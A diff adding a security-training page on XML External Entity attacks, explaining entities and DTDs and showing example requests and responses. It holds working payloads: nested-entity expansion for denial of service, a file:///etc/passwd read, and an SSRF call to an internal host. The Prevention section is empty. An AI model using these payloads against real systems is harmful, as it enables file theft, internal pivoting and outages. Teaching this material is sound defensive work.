@@ -1,5 +1,120 @@
 ---
-title: XML Entity
+title: XML Entity Expansion
 authors: [yanzhang]
 sidebar_position: 7
 ---
+
+# XML Entity Expansion
+
+## Description
+
+XML External Entity (XXE) attacks target applications that process XML input by exploiting the parser’s ability to handle external entities. By submitting malicious XML data that defines external entities, attackers can take advantage of insecure parser configurations to access files on the server, perform denial-of-service (DoS) attacks, or communicate with internal systems the application can reach.
+
+These vulnerabilities stem from the XML format’s built-in features, some of which can be dangerous if not properly managed. Given the potential impact and continued occurrence of XXE attacks, they are included in the OWASP Top 10 list under the Security Misconfiguration category.
+
+As with many other security issues, the frequency of XXE vulnerabilities could be significantly reduced through regular, up-to-date secure coding training for developers. 
+
+## Impact 
+
+XXE attacks can lead to denial-of-service (DoS) incidents and the exposure of sensitive local files, such as passwords or private user data. Since the attack targets the application processing the XML, it can also be used to move laterally within a network, potentially enabling Server-Side Request Forgery (SSRF) attacks against internal systems that lack proper protections.
+
+Despite XML-related vulnerabilities being known for nearly two decades, major tech companies like Google and Facebook have still encountered such issues in recent years. This highlights the ongoing risk that misconfigurations and insecure coding practices can pose—often resulting in significant consequences, including regulatory fines.
+
+## Scenarios
+
+To understand XXE vulnerabilities, it's important to focus on two key features of XML: XML entities and the Document Type Definition (DTD).
+
+XML entities allow data within an XML document to be represented using placeholders instead of actual content. For instance, predefined entities like &lt; and &gt; represent the < and > characters. Developers can define custom entities using DTDs.
+
+Document Type Definitions (DTDs) define the structure and allowed elements of an XML document and are often used for validation. A DTD can be embedded directly in an XML document using a DOCTYPE declaration, or it can reference an external source via a URL.
+
+### Denial-of-Service (DoS) Attacks
+
+Malicious actors can exploit XML entities to overload the XML parser and cause denial-of-service conditions. One common technique is nesting entities within each other—leading to massive memory consumption. A well-known example is the Billion Laughs attack, where entities recursively expand into large blocks of text, overwhelming the parser.
+
+```
+POST http://www.vulnerableapp.com/xml HTTP/1.1
+
+<?xml version="1.0" encoding="ISO-8859-1"?> 
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY bar "SecureFlag ">
+  <!ENTITY t1 "&bar;&bar;">
+  <!ENTITY t2 "&t1;&t1;&t1;&t1;">
+  <!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
+]>
+<foo>
+  Join &t3;
+</foo>
+```
+```
+HTTP/1.0 200 OK
+
+Join SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlagSecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag SecureFlag (repeated many times)
+```
+
+This recursive expansion can exhaust system resources, crashing or slowing down the application.
+
+
+
+### Server-Side Request Forgery Attacks
+
+XML external entities can also be used to retrieve local files from the system, such as /etc/passwd, which may contain sensitive information.
+
+**Request**
+```
+POST http://www.vulnerableapp.com/xml HTTP/1.1
+
+<?xml version="1.0" encoding="ISO-8859-1"?> 
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM
+  "file:///etc/passwd">
+]>
+<foo>
+  &xxe;
+</foo>
+```
+ 
+**Response**
+
+```
+HTTP/1.0 200 OK
+ 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh 
+(...)
+```
+
+Attackers can also direct the entity to a URL, effectively tricking the server into making HTTP requests to internal systems—this is known as Server-Side Request Forgery (SSRF).
+
+**Request**
+
+```
+POST http://www.vulnerableapp.com/xml HTTP/1.1
+
+<?xml version="1.0" encoding="ISO-8859-1"?> 
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM
+  "http://internal.vulnerableapp.com:8443">
+]>
+<foo>
+  &xxe;
+</foo>
+```
+
+**Response**
+
+```
+HTTP/1.0 200 OK
+ 
+(.. result of the request to http://internal.vulnerableapp.com:8443 ...)
+```
+
+By exploiting SSRF, attackers can pivot to internal or backend systems that are otherwise inaccessible from the outside.
+
+## Prevention
+
